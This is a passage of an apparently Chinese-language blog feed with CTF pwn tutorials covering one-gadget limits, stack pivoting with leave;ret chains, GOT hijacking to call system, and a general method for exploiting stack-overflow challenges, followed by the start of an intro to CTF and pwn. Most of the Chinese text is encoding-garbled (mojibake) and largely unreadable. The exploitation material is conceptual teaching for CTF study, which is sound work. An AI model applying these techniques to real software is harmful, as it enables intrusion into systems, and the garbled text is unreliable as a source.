ç­”æ¡ˆæ˜¯ï¼šæœ‰ï¼Œè€Œä¸”ä¸æ­¢ä¸€ä¸ªã€‚è¿™ç§ä¸€æ­¥åˆ°ä½çš„gadgetï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸º&lt;strong&gt;one gadget&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;çœ‹èµ·æ¥åƒæ¢­å“ˆçš„ï¼Œå¾ˆæ–¹ä¾¿å–”ï¼ä½†æ˜¯åˆå±€é™æ€§çš„ï¼Œ&lt;/p&gt;
&lt;p&gt;å¸ˆå‚…ï¼Œé‚£æˆ‘è¿˜å­¦ä»€ä¹ˆROPï¼Œç›´æ¥æ¯æ¬¡ä¸€æ­¥åˆ°ä½ä¸å°±å¾—äº†ï¼Ÿæƒ³æ³•æ€»æ˜¯å¥½çš„ï¼Œä½†æ˜¯ç°å®æ˜¯å¾ˆå·®å¼ºäººæ„çš„ã€‚
onegadgeté€šå¸¸æœ‰å˜é‡è¦æ±‚ï¼Œæ¯”å¦‚æ ˆä¸­çš„æŸä¸ªåç§»å¤„å€¼å¿…é¡»ä¸º0ï¼Œraxå¿…é¡»ä¸º0ã€‚æ‰€ä»¥è¯´ï¼Œonegadgetè¿™ä¸ªä¸œè¥¿ï¼Œæ¯”è¾ƒç„å­¦ï¼Œä¸é è°±ã€‚&lt;/p&gt;
&lt;p&gt;æ€è·¯äºŒï¼šæ²¡æ¡ä»¶åˆ›é€ æ¡ä»¶&lt;/p&gt;
&lt;p&gt;è®¡ç®—æœºæ˜¯æ€ä¹ˆçŸ¥é“æ ˆçš„ï¼Ÿç­”ï¼šé€šè¿‡rbprsp&lt;/p&gt;
&lt;p&gt;ROPæ€ä¹ˆç»´æŠ¤é€»è¾‘çš„?ç­”ï¼šé€šè¿‡ä¸€ç³»åˆ—çš„popå’Œretæ“ä½œï¼Œä¾é rspã€‚&lt;/p&gt;
&lt;p&gt;æº¢å‡ºå­—èŠ‚ä¸å¤Ÿï¼Œropå†™ä¸å®Œï¼Œrspä¸€æ¡è·¯èµ°åˆ°é»‘ï¼Œä¸€é¡¿popretæ“ä½œåè·‘åˆ°äº†æˆ‘ä»¬æº¢å‡ºæ§åˆ¶åŒºåŸŸå¤–ã€‚&lt;/p&gt;
&lt;p&gt;é—®é¢˜å½’çº³æ€»ç»“ï¼šæº¢å‡ºå­—èŠ‚ä¸å¤Ÿåªæ˜¯åŸå› ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯è®©rspåœ¨æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶çš„åŒºåŸŸè‡ªç”±é£ç¿”ã€‚&lt;/p&gt;
&lt;h3 id=&#34;æ ˆè½¬ç§»&#34;&gt;æ ˆè½¬ç§»
&lt;/h3&gt;&lt;p&gt;åªè¦æ§åˆ¶rspä¸€ç›´åœ¨æˆ‘ä»¬å¯æ§åˆ¶å†…å®¹çš„åŒºåŸŸï¼Œå°±å¯ä»¥å®Œæˆropã€‚é‚£ä¹ˆï¼Œå¦‚ä½•æ§åˆ¶RSP?å…¶å®å°±æ˜¯mov rsp XXX è¿™ç§æ•ˆæœã€‚æœ‰æ²¡æœ‰mov rsp raxï¼›retï¼Œæˆ–è€…pop rspï¼›retè¿™ç§gadgetså‘¢?ç†è®ºä¸Šåº”è¯¥æœ‰çš„ï¼Œä½†æ˜¯å®é™…æƒ…å†µä¸‹æå…¶å°‘è§ã€‚é‚£ä¹ˆï¼Œé™¤äº†pushå’Œpopï¼Œè¿˜æœ‰æ²¡æœ‰å…¶ä»–å¸¸è§æŒ‡ä»¤èƒ½å¯¹rspå€¼è¿›è¡Œæ›´æ”¹å‘¢?&lt;/p&gt;
&lt;p&gt;é‚£å°±æ˜¯&lt;em&gt;&lt;strong&gt;leave ret&lt;/strong&gt;&lt;/em&gt;ï¼Œ&lt;code&gt;leave&lt;/code&gt;æŒ‡ä»¤çš„å®é™…æ•ˆæœå°±æ˜¯mov rsprbp; pop rbpï¼›ç”¨äºæ¢å¤æ ˆå¸§ï¼Œé€šå¸¸ä¸retè¿ç”¨ã€‚
è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œleaveå°†rbpçš„å€¼ç¬¦ç»™äº†rspã€‚
ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬&lt;strong&gt;æ§åˆ¶äº†rbpæŒ‡é’ˆï¼Œå°±å¯ä»¥æ§åˆ¶rsp&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;h4 id=&#34;æ ˆè½¬ç§»ç¬¬ä¸€ç§æ–¹æ³•&#34;&gt;æ ˆè½¬ç§»ç¬¬ä¸€ç§æ–¹æ³•
&lt;/h4&gt;&lt;p&gt;pop rbp; ret+ leave; ret&lt;/p&gt;
&lt;p&gt;ropçš„æ„æˆï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pop rbp;ret;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;target stack address
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;leave;ret;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;é¦–å…ˆåˆ©ç”¨pop rbp retæ¥æ§åˆ¶rbpæŒ‡é’ˆçš„å€¼ä¸ºæˆ‘ä»¬æƒ³è¦å°†æ ˆè½¬ç§»åˆ°çš„åœ°å€ï¼Œç„¶åæ‰§è¡Œleaveï¼›retæ¥æ§åˆ¶rspæŒ‡é’ˆã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬è®¡ç®—ä¸€ä¸‹æ€»å…±æº¢å‡ºçš„å­—èŠ‚ï¼Œpop rbpï¼› retçš„åœ°å€ä¸ºè¿”å›åœ°å€ï¼Œåç»­çš„æ‰€éœ€è¦çš„&lt;strong&gt;æº¢å‡ºå­—èŠ‚æ•°ä»…ä»…ä¸º16å­—èŠ‚&lt;/strong&gt;ï¼Œå¦‚æœç®—ä¸Šæº¢å‡ºè¦†ç›–åˆ°çš„rbpæŒ‡é’ˆå’Œè¿”å›åœ°å€ï¼Œ
é‚£ä¹ˆä¸€å…±æ˜¯32å­—èŠ‚ã€‚ç„¶åæ ˆè½¬ç§»åˆ°æˆ‘ä»¬ç›®æ ‡çš„åœ°å€ä¸Šç»§ç»­æ‰§è¡Œropã€‚&lt;/p&gt;
&lt;h4 id=&#34;æ ˆè½¬ç§»ç¬¬äºŒç§æ–¹æ³•&#34;&gt;æ ˆè½¬ç§»ç¬¬äºŒç§æ–¹æ³•
&lt;/h4&gt;&lt;p&gt;ä¸¤æ¬¡leave ret&lt;/p&gt;
&lt;p&gt;ropæ„æˆï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;target stack address
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;leave ret;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;leave ret;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™ç§æ–¹å¼ä¸ä¸Šä¸€ç§æ–¹å¼å¤§åŒå°å¼‚ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦å°†æ ˆä¸Šä¿å­˜çš„rbpï¼ˆä¹Ÿå°±æ˜¯è¿”å›åœ°å€ä¹‹å‰ï¼‰æ”¹æˆè¿ç§»çš„åœ°å€ã€‚ç¨‹åºåœ¨ç¬¬ä¸€æ¬¡æ‰§è¡Œleave retæ—¶ï¼Œä¼šå°†rbpæåˆ°ç›®æ ‡è¿ç§»åœ°å€ä¸Šã€‚å†æ¬¡æ‰§è¡Œleave retæ—¶ï¼Œæ•ˆæœå°±å’Œä¹‹å‰ä¸€æ ·äº†ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆæº¢å‡ºå­—èŠ‚ä»…ä»…éœ€è¦8ä¸ªå­—èŠ‚ï¼Œç®—ä¸Šè¦†ç›–çš„rbpä»¥åŠè¿”å›åœ°å€ï¼Œä¸€å…±éœ€è¦24å­—èŠ‚æº¢å‡ºã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å¦‚æœæˆ‘ä»¬æº¢å‡ºçš„å‡½æ•°æœ¬èº«ç»“å°¾å¸¦æœ‰leaveï¼›retï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æº¢å‡º16å­—èŠ‚ï¼Œåªéœ€è¦è¦†ç›–åˆ°è¿”å›åœ°å€å³å¯&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;æ€»ä¹‹ï¼Œæ ˆè½¬ç§»é€šè¿‡å°† &lt;code&gt;rsp&lt;/code&gt; æŒ‡å‘å¯æ§åŒºåŸŸï¼Œè§£å†³äº†ä»¥ä¸‹é—®é¢˜ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;åŸå§‹æ ˆç©ºé—´ä¸è¶³ï¼Œæ— æ³•æ„é€ é•¿ ROP é“¾ï¼›&lt;/li&gt;
&lt;li&gt;åˆ©ç”¨å †æˆ–å…¶ä»–å¯å†™åŒºåŸŸï¼ˆå¦‚ &lt;code&gt;.bss&lt;/code&gt; æ®µï¼‰ä½œä¸ºæ–°æ ˆï¼Œç»•è¿‡æ ˆä¿æŠ¤æœºåˆ¶ï¼›&lt;/li&gt;
&lt;li&gt;ä¸²è”å¤šä¸ªåˆ†æ•£çš„ gadgetï¼Œå®ç°å¤æ‚æ”»å‡»é€»è¾‘ï¼ˆå¦‚è°ƒç”¨ &lt;code&gt;execve&lt;/code&gt; æˆ–æ³„éœ² libc åœ°å€ï¼‰ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å…¶æœ¬è´¨æ˜¯åˆ©ç”¨ &lt;code&gt;leave&lt;/code&gt; æŒ‡ä»¤å¯¹ &lt;code&gt;rbp&lt;/code&gt; å’Œ &lt;code&gt;rsp&lt;/code&gt; çš„å…³è”å…³ç³»ï¼Œé€šè¿‡æ§åˆ¶ &lt;code&gt;rbp&lt;/code&gt; é—´æ¥ â€œåŠ«æŒâ€ æ ˆæŒ‡é’ˆï¼Œæ˜¯ ROP è¿›é˜¶åˆ©ç”¨ä¸­çš„å…³é”®æŠ€æœ¯ã€‚&lt;/p&gt;
&lt;h2 id=&#34;æ”¹å†™gotè¡¨getshellæ–¹æ³•&#34;&gt;æ”¹å†™.gotè¡¨getshellæ–¹æ³•
&lt;/h2&gt;&lt;p&gt;æˆ‘ä»¬æ€è€ƒä¸€ä¸‹ï¼Œç¨‹åºè°ƒç”¨å‡½æ•°éƒ½æ˜¯é€šè¿‡è®¿é—®gotè¡¨ã€‚
å¦‚æœæˆ‘ä»¬å°†.gotè¡¨ä¸­åŸæœ¬å­˜æ”¾æ¯”å¦‚è¯´putså‡½æ•°çš„åœ°å€ï¼Œæ”¹æˆsystemå‡½æ•°çš„åœ°å€ï¼Œè¿™æ ·ç¨‹åºæƒ³è¦è°ƒç”¨putsæ—¶ï¼Œå®é™…è°ƒç”¨çš„å´æ˜¯systemï¼Œåˆ©ç”¨è¿™ç§æ–¹å¼getshellï¼Œä¸æ˜¯å¾ˆå¥½å—ï¼Ÿ&lt;/p&gt;
&lt;p&gt;è¿™ç§æ–¹å¼å«åšgotè¡¨åŠ«æŒï¼Œæ˜¯ä¸€ç§é—´æ¥æ§åˆ¶ç¨‹åºæ‰§è¡Œæµçš„æ–¹å¼ã€‚&lt;/p&gt;
&lt;p&gt;GOTçš„åœ°å€ï¼Œåœ¨æ²¡å¼€PIEçš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨IDAä¸­æŸ¥çœ‹ï¼Œä¹Ÿå¯ä»¥ç”¨pwntoolsæŒ‡ä»¤æŸ¥è¯¢ï¼šelf.GOT[&amp;ldquo;puts&amp;rdquo;]&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/pwn-2/4.png&#34;
	width=&#34;999&#34;
	height=&#34;321&#34;
	srcset=&#34;https://expl0rer.top/p/pwn-2/4_hu_6233a4acaebdd711.png 480w, https://expl0rer.top/p/pwn-2/4_hu_2afefb642b4f59a8.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;311&#34;
		data-flex-basis=&#34;746px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;åœ¨æˆ‘ä»¬åŠ«æŒgotè¡¨æ—¶ï¼Œå¸¸è§çš„æœ‰å¦‚ä¸‹å‡ ç§ï¼š
puts(buf)ã€atoi(buf)ã€atol(buf)ã€free(buf)&lt;/p&gt;
&lt;p&gt;freeåœ¨å½“å‰é˜¶æ®µå°‘è§ï¼Œåœ¨åç»­çš„å †ä¼šå¾ˆå¸¸è§ã€‚&lt;/p&gt;
&lt;p&gt;æ€»çš„æ¥è¯´ï¼ŒæŠŠè¿™äº›ç¬¬ä¸€ä¸ªå‚æ•°ä¹Ÿå°±æ˜¯rdiæŒ‡é’ˆæŒ‡å‘æˆ‘ä»¬å¯ä»¥æ§åˆ¶è¾“å…¥çš„åŒºåŸŸçš„å‡½æ•°ï¼Œæ”¹æˆsystemï¼Œè¿™æ ·ï¼Œå½“æˆ‘ä»¬ç¨‹åºæ‰§è¡Œåˆ°è°ƒç”¨è¿™äº›å‡½æ•°æ—¶ï¼Œç¨‹åºå°±è¢«åŠ«æŒåˆ°æˆ‘ä»¬ç›®æ ‡å‡½æ•°å¤„äº†ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚ä½•æ”¹å†™ï¼Ÿ&lt;/p&gt;
&lt;p&gt;ROP: read (0, got, size)ï¼›&lt;/p&gt;
&lt;p&gt;è¾¾åˆ°ä»»æ„å†…å­˜åœ°å€å†™åï¼Œä¸èƒ½ç¡®å®šæ ˆåœ°å€ï¼Œè€ƒè™‘å†™gotã€‚&lt;/p&gt;
&lt;p&gt;bssç­‰æ®µè¶Šç•Œè®¿é—®(è´Ÿå€¼)ã€‚&lt;/p&gt;
&lt;p&gt;ä¸»è¦çœ‹ç¨‹åºé€»è¾‘ï¼Œå…·ä½“é—®é¢˜å…·ä½“åˆ†æã€‚&lt;/p&gt;
&lt;h2 id=&#34;pwnæ ˆæº¢å‡ºé¢˜çš„ä¸€èˆ¬è§£é¢˜æ€è·¯&#34;&gt;PWNæ ˆæº¢å‡ºé¢˜çš„ä¸€èˆ¬è§£é¢˜æ€è·¯
&lt;/h2&gt;&lt;p&gt;ç›´æ¥æ§åˆ¶æ‰§è¡Œæµï¼šshellcode &amp;amp;ROP&lt;/p&gt;
&lt;p&gt;é—´æ¥æ§åˆ¶æ‰§è¡Œæµï¼šæ”¹å†™å‡½æ•°æŒ‡é’ˆï¼Œå¦‚gotè¡¨ã€‚&lt;/p&gt;
&lt;p&gt;ä¿æŠ¤æœºåˆ¶ç»•è¿‡ï¼šcanaryã€ASLRã€PIE&lt;/p&gt;
&lt;p&gt;æ–¹æ³•è®º&lt;/p&gt;
&lt;h3 id=&#34;ç¬¬ä¸€æ­¥æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯checksecçœ‹æ¶æ„ä¿æŠ¤ä¿¡æ¯&#34;&gt;ç¬¬ä¸€æ­¥ã€æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯ï¼ˆchecksecçœ‹æ¶æ„ã€ä¿æŠ¤ä¿¡æ¯ï¼‰
&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;ä¸€èˆ¬æ¥è¯´ï¼Œæ ˆé¢˜ç›®éƒ½ä¼šæˆ–å¤šæˆ–å°‘å…³é—­ä¸€äº›ä¿æŠ¤ã€‚
å¦‚æœå…³äº†canaryï¼Œé‚£ä¹ˆå¤§æ¦‚ç‡æ˜¯æ ˆé¢˜ã€‚å¦‚æœå¼€å¯äº†PIEï¼Œé‚£ä¹ˆå°±éœ€è¦æ‰¾ä¸ªåœ°æ–¹æ³„æ¼åœ°å€ä¿¡æ¯ã€‚å¦‚æœå¼€å¯äº† FULL RELROï¼Œé‚£ä¹ˆæ€è·¯å°±ä¸åº”è¯¥æ˜¯æ”¹å†™gotã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;ç¬¬äºŒæ­¥ç†æ¸…å‡½æ•°é€»è¾‘å¦‚ä½•æ‰§è¡Œ&#34;&gt;ç¬¬äºŒæ­¥ã€ç†æ¸…å‡½æ•°é€»è¾‘ï¼ˆå¦‚ä½•æ‰§è¡Œï¼Ÿï¼‰
&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;ç›´æ¥åœ¨linuxä¸­è¿è¡Œï¼Œä¸¢è¿›idaï¼Œé™æ€åˆ†æã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæŠŠå‡½æ•°åã€å˜é‡ç­‰ç­‰ææˆè‡ªå·±çœ‹å¾—æ‡‚çš„åœ°æ­¥ã€‚å¦‚æœæœ‰ç»“æ„ä½“ï¼Œæœ€å¥½èŠ±æ—¶é—´å»ºä¸€ä¸ªç»“æ„ä½“,è¿™æ ·ä¹‹ååˆ†æçœäº‹ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;ç¬¬ä¸‰æ­¥æ‰¾åˆ°æ¼æ´æ ˆå †getså‡½æ•°systemexecv&#34;&gt;ç¬¬ä¸‰æ­¥ã€æ‰¾åˆ°æ¼æ´ï¼ˆæ ˆï¼Ÿå †ï¼Ÿgetså‡½æ•°ã€systemã€execvï¼‰
&lt;/h3&gt;&lt;blockquote class=&#34;alert alert-warn&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;æ‰¾æ¼æ´æ˜¯å¾ˆè€ƒéªŒç»éªŒçš„ã€‚&lt;/p&gt;
&lt;p&gt;ä¸€èˆ¬å…ˆåˆ†æä¸€ä¸‹å±é™©å‡½æ•°ï¼Œæ¯”å¦‚&lt;code&gt;gets&lt;/code&gt;ã€&lt;code&gt;read&lt;/code&gt;ã€&lt;code&gt;write&lt;/code&gt;ã€&lt;code&gt;free&lt;/code&gt;ã€&lt;code&gt;printf&lt;/code&gt;ç­‰ç­‰ã€‚
å¾ˆå¤šPWNé¢˜ç›®ä¼šè‡ªå·±å°è£…ä¸€ä¸ª&lt;code&gt;input&lt;/code&gt;å‡½æ•°,é‡ç‚¹åˆ†æä¸€ä¸‹ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰è¶Šç•Œã€‚
åˆ†æçš„æ—¶å€™ä¹Ÿæœ‰æŠ€å·§ï¼Œé€šå¸¸æˆ‘ä»¬è¦çœ‹çœ‹æˆ‘ä»¬çš„è¾“å…¥æ•°æ®ä¼šè¢«ç¨‹åºå¦‚ä½•å¤„ç†ã€‚&lt;/p&gt;
&lt;p&gt;ç”±äºpwnå¤šæ•°æ˜¯&lt;strong&gt;å†…å­˜ç ´åæ¼æ´&lt;/strong&gt;ï¼Œæ‰€ä»¥å¯¹äºå†…å­˜æ‹·è´ç­‰å‡½æ•°è¦æ ¼å¤–æ³¨æ„ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;ç¬¬å››æ­¥æ¼æ´åˆ©ç”¨å†™exppayload&#34;&gt;ç¬¬å››æ­¥ã€æ¼æ´åˆ©ç”¨ï¼ˆå†™expã€payloadï¼‰
&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;åŸºæœ¬ä¸Šæ‰¾åˆ°æ¼æ´å·¥ä½œå°±å®Œæˆäº†ä¸€åŠã€‚
æ¼æ´åˆ©ç”¨å’Œç¨‹åºæœ¬èº«çš„é€»è¾‘ä»¥åŠä¿æŠ¤æœºåˆ¶æ¯æ¯ç›¸å…³ã€‚é€šå¸¸æ¥è¯´ï¼Œéœ€è¦è§£å†³ä»¥ä¸‹å‡ ä¸ªé—®é¢˜ï¼š&lt;/p&gt;
&lt;h4 id=&#34;åœ°å€é—®é¢˜&#34;&gt;&lt;strong&gt;åœ°å€é—®é¢˜&lt;/strong&gt;
&lt;/h4&gt;&lt;p&gt;æˆ‘ä»¬ç¼–å†™EXPç¦»ä¸å¼€å‡½æ•°åœ°å€ä»¥åŠgadgetsåœ°å€ã€‚&lt;/p&gt;
&lt;p&gt;å¼€å¯äº†PIEå’ŒASLRï¼Œæˆ‘ä»¬å°±éœ€è¦æƒ³åŠæ³•æ³„æ¼åœ°å€ã€‚&lt;/p&gt;
&lt;p&gt;æ³„æ¼æ–¹æ³•ä¸€èˆ¬å°±æ˜¯è®©ç¨‹åºæ‰“å°å‡ºæ¥ä¸€äº›è„æ•°æ®æˆ–è€…å‡½æ•°åœ°å€ã€‚&lt;/p&gt;
&lt;p&gt;ç¨‹åºåŸºåœ°å€ã€å †åœ°å€ã€IibcåŸºåœ°å€ã€æ ˆåœ°å€ã€‚&lt;/p&gt;
&lt;h4 id=&#34;canaryå’Œnxé—®é¢˜&#34;&gt;&lt;strong&gt;canaryå’ŒNXé—®é¢˜&lt;/strong&gt;
&lt;/h4&gt;&lt;p&gt;å¦‚æœç¡®å®šæ˜¯æ ˆé¢˜ï¼Œå¹¶ä¸”æœ‰canaryï¼Œé‚£ä¹ˆé€šå¸¸è€ƒè™‘æ³„æ¼æˆ–è€…ä¿®æ”¹canaryã€‚ä¸€èˆ¬æ¥è¯´ï¼ŒNXéƒ½æ˜¯å¼€å¯çš„ï¼Œæ²¡æœ‰å¼€å¯å°±è¯´æ˜è¦ä½ æ‰§è¡Œ&lt;code&gt;shellcode&lt;/code&gt;äº†ã€‚&lt;/p&gt;
&lt;p&gt;NXå¯¹äºæˆ‘ä»¬å†™ROPåŸºæœ¬æ²¡å½±å“ï¼Œç»•è¿‡æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼š&lt;code&gt;mprotect&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;ç¨‹åºæœ¬èº«çš„é™åˆ¶&#34;&gt;ç¨‹åºæœ¬èº«çš„é™åˆ¶
&lt;/h4&gt;&lt;p&gt;gadgetç§ç±»å°‘ã€è¾“å…¥å­—ç¬¦æœ‰é™åˆ¶ã€æ ˆæº¢å‡ºå­—èŠ‚ä¸å¤Ÿã€å…·ä½“æƒ…å†µå…·ä½“åˆ†æã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;h2 id=&#34;å®Œç»“&#34;&gt;å®Œç»“
&lt;/h2&gt;&lt;p&gt;æ ˆçš„è®²è§£å°±åˆ°è¿™ï¼Œå¯èƒ½å†…å®¹æ¯”è¾ƒå°‘ï¼Œæ¦‚å¿µæŠ½è±¡äº›ï¼Œä¹Ÿæ˜¯æ€ªå°ç”ŸåŸºç¡€ä¸ç‰¢ç†è§£åŠ›ä¸å¤Ÿå¼ºğŸ˜„ï¼Œè¿˜å¾—åŒºçœ‹çœ‹PWBé¢˜åŠ å¼ºä¸€ä¸‹ã€‚&lt;/p&gt;
</description>
        </item>
        <item>
        <title>PWN-1</title>
        <link>https://expl0rer.top/p/pwn-1/</link>
        <pubDate>Thu, 21 Aug 2025 00:00:00 +0000</pubDate>
        
        <guid>https://expl0rer.top/p/pwn-1/</guid>
        <description>&lt;img src="https://expl0rer.top/p/pwn-1/PWN.png" alt="Featured image of post PWN-1" /&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å‰æ–‡ï¼šä»¥ä¸‹æ˜¯æˆ‘å…¥é—¨PWNçš„è®°å½•ï¼Œæ¬¢è¿å„ä½å‰æ¥è§‚çœ‹ï¼Œå°å¼Ÿé¢†æ•™ï¼&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;ctfæ˜¯ä»€ä¹ˆ&#34;&gt;CTFæ˜¯ä»€ä¹ˆï¼Ÿ
&lt;/h1&gt;&lt;p&gt;CTFï¼ˆCapture The Flagï¼‰ä¸­æ–‡ä¸€èˆ¬è¯‘ä½œå¤ºæ——èµ›ï¼Œåœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸä¸­æŒ‡çš„æ˜¯ç½‘ç»œå®‰å…¨æŠ€æœ¯äººå‘˜ä¹‹é—´è¿›è¡ŒæŠ€æœ¯ç«æŠ€çš„ä¸€ç§æ¯”èµ›å½¢å¼ã€‚CTFèµ·æºäº1996å¹´DEFCONå…¨çƒé»‘å®¢å¤§ä¼šï¼Œä»¥ä»£æ›¿ä¹‹å‰é»‘å®¢ä»¬é€šè¿‡äº’ç›¸å‘èµ·çœŸå®æ”»å‡»è¿›è¡ŒæŠ€æœ¯æ¯”æ‹¼çš„æ–¹å¼ã€‚å‘å±•è‡³ä»Šï¼Œå·²ç»æˆä¸ºå…¨çƒèŒƒå›´ç½‘ç»œå®‰å…¨åœˆæµè¡Œçš„ç«èµ›å½¢å¼ã€‚&lt;/p&gt;
&lt;p&gt;CTFæ¯”èµ›å½¢å¼ä¸»è¦ä¸º&lt;strong&gt;çº¿ä¸Šè§£é¢˜ï¼ˆjeopardyï¼‰&lt;strong&gt;å’Œ&lt;/strong&gt;çº¿ä¸‹æ”»é˜²ï¼ˆAttack With Defenceï¼‰&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;çº¿ä¸Šèµ›é¢˜ç›®å¤§è‡´æ–¹å‘æœ‰WEBã€REã€PWNã€MISCã€CRYPTOï¼Œè§£å‡ºflagäº¤ç»™æœåŠ¡å™¨éªŒè¯é€šè¿‡æ‰å¾—åˆ†ã€‚&lt;/p&gt;
&lt;h2 id=&#34;pwnç®€ä»‹&#34;&gt;PWNç®€ä»‹
&lt;/h2&gt;&lt;p&gt;Pwnæ˜¯ä»€ä¹ˆï¼Ÿ&lt;/p&gt;
&lt;p&gt;&amp;ldquo;Pwn&amp;quot;æ˜¯ä¸€ä¸ªé»‘å®¢è¯­æ³•çš„ä¿šè¯­è¯ï¼Œæ˜¯æŒ‡æ”»ç ´è®¾å¤‡æˆ–è€…ç³»ç»Ÿã€‚å‘éŸ³ç±»ä¼¼â€œç °â€ï¼Œå¯¹é»‘å®¢è€Œè¨€ï¼Œè¿™å°±æ˜¯æˆåŠŸå®æ–½é»‘å®¢æ”»å‡»çš„å£°éŸ³ä¸€ç ”çš„ä¸€å£°ï¼Œè¢«â€œé»‘â€çš„ç”µè„‘æˆ–æ‰‹æœºå°±è¢«ä½ æ“çºµäº†ã€‚CTFä¸­çš„PWNä¸»è¦æ˜¯é’ˆå¯¹äºäºŒè¿›åˆ¶æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨ï¼Œé€šå¸¸æƒ…å†µä¸‹é€‰æ‰‹éœ€è¦å¯¹äºä¸€ä¸ªæœ‰æ¼æ´çš„å¯æ‰§è¡Œæ–‡ä»¶è¿›è¡Œåˆ†æï¼Œæ‰¾åˆ°æ¼æ´ï¼Œç„¶ååˆ©ç”¨æ¼æ´è¯»å–è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„FLAGã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/pwn-1/hacker.png&#34;
	width=&#34;1665&#34;
	height=&#34;715&#34;
	srcset=&#34;https://expl0rer.top/p/pwn-1/hacker_hu_702f4e64d6a77d56.png 480w, https://expl0rer.top/p/pwn-1/hacker_hu_91330cec3c1ac9fa.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;232&#34;
		data-flex-basis=&#34;558px&#34;
	
&gt;&lt;/p&gt;
